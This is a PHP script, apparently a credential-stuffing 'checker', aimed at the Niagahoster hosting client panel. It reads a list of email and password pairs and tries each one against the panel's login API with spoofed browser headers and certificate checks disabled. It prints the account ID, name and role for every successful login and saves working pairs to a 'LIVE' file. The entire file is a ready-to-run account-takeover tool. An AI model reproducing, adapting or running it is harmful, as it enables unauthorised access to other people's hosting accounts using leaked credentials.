<?php
/**
* @author Z0NK3X
* @package GHOST CHECKER [ NIAGA HOSTER ]
* Time 2018-09-04 21:25:07
* @link fb.com/aardzz
*/
	$green  = "\e[1;92m";
	$cyan   = "\e[1;36m";
	$normal  = "\e[0m";
	$blue   = "\e[1;34m";
	$green1 = "\e[0;92m";
	$yellow = "\e[93m";
	$red    = "\e[0;91m";
function login($url, $param){
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $url);
	curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36");
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, array(
'origin: https://panel.niagahoster.co.id',
'accept-language: en-US,en;fb.com/aardzzq=0.9,id;q=0.8',
'content-type: application/x-www-form-urlencoded',
'accept: application/json, text/javascript, */*; q=0.01',
'referer: https://panel.niagahoster.co.id/client/logout',
'authority: panel.niagahoster.co.id',
'x-requested-with: XMLHttpRequest',
	));
	curl_setopt($c, CURLOPT_POSTFIELDS,$param);
	curl_setopt($c, CURLOPT_POST, 1);
	$out = curl_exec($c);
	return $out;
}
function save($name, $isi)
{
    $jud1 = fopen($name, "a");
    fwrite($jud1, $isi . "\n");
    fclose($jud1);
}
function banner(){
	$green  = "\e[1;92m";
	$cyan   = "\e[1;36m";
	$normal  = "\e[0m";
	$blue   = "\e[1;34m";
	$green1 = "\e[0;92m";
	$yellow = "\e[93m";
	$red    = "\e[1;91m";
	return $cyan.
"+------------------------------------------------+

    ╔╗╔╔═╗╦ ╦╔═╗╔═╗╔╦╗  ┌─┐┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
    ║║║║ ╦╠═╣║ ║╚═╗ ║   │  ├─┤├┤ │  ├┴┐├┤ ├┬┘
    ╝╚╝╚═╝╩ ╩╚═╝╚═╝ ╩   └─┘┴ ┴└─┘└─┘┴ ┴└─┘┴└─
    ".date("Y-m-d H:i:s")."     NIAGAHOSTER CHECKER

+--------------------[ Z0NK3X ]------------------+\n".$normal; // font calvin s
}

echo banner();
$delay = 2;
$file = readline(" [*] Enter File Name : ");
if (!file_exists($file)) {
	echo $red." [!] File isn't Exist!\n".$normal;
exit();
}
$count = count(file($file));
echo " [*] Total Empas : ".$count."\n";
date_default_timezone_set("Asia/Jakarta");
$x = 1;
echo " [*] Time     : ".date("H:i:s")."\n";
echo " [*] TimeOut  : ".$delay."s\n";
echo " [*] Starting\n";
foreach(explode("\n",file_get_contents($file)) as $empas){
echo $cyan."+------------------------------------------------+\n".$normal;
echo " [*] No       : ".$x++." From $count\n";
$pecah = explode("|", $empas);
$email = $pecah[0];
$pass  = $pecah[1];
echo " [*] Email    : ".$email."\n";
echo " [*] Password : ".$pass."\n";
$form_data = "email=".$email."&password=".$pass."&remember=1";
echo $blue." [*] Trying Login\n".$normal;
sleep($delay);
$data = json_decode(login("https://panel.niagahoster.co.id/api/guest/client/login",$form_data),1);
if ($data["error"] == null) {
	echo $green1." [+] Login Success!\n";
	echo " [+] Account is LIVE\n".$normal;
	echo " [*] Getting All Information\n";
	echo $cyan." [*] DETAILS ================================[*]>\n".$normal;
	echo " [+] ID Acc   : ".$data["result"]["id"]."\n";
	echo " [+] Email    : ".$data["result"]["email"]."\n";
	echo " [+] Name     : ".$data["result"]["name"]."\n";
	echo " [+] Role Acc : ".$data["result"]["role"]."\n";
	save("ghost-LIVE.txt", $empas);
}else{
	echo $red." [-] Login Failed!\n".$normal;
	save("ghost-DIE.txt", $empas);
}
}
echo $cyan."+--------------------[ FINISH ]------------------+\n".$normal; // font calvin s
?>
